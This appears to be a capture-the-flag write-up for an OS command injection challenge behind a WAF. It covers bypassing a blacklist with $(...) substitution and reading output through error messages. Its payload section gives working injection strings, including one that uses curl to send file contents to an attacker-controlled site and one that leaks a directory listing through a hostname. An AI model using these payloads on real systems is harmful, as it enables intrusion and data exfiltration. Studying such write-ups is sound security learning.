* Category
  * OS Command Injection
  * WAF
  * Out of Band
* Solution
  1. How to bypass blacklist?
     * ```$(...)```
  2. How to know the command's output?
     * Warning message of linux 
  3. How to show root directory?
     * ```system``` only returns stdout's content
       * ```ls /``` outputs too much content $\rightarrow$ ```host``` returns stderr
     * Three method
       1. send the return value to outside (other website to inspect http)
          * ```ngrok http 5000``` can open http locally and forward network to local
       2. guess the flag file starts with ```flag``` and ```cat``` directly
       3. ```printf```
* Payload
  1. ```'"$(curl CONTROLLED-WEBSITE --data $(cat /f*))"'```
  2. ```'"$(printf '%s.' $(ls ../../../))"'```
     * ```.``` is necessary since host's input needs to be a valid syntax of domain name
     * ```.``` will concatenate the parameters with separation = '.'
* Reference
  * [Assign the output of a command to a shell variable](https://unix.stackexchange.com/questions/16024/how-can-i-assign-the-output-of-a-command-to-a-shell-variable)
* ```FLAG{Y0U_$(Byp4ssed)_th3_`waf`}```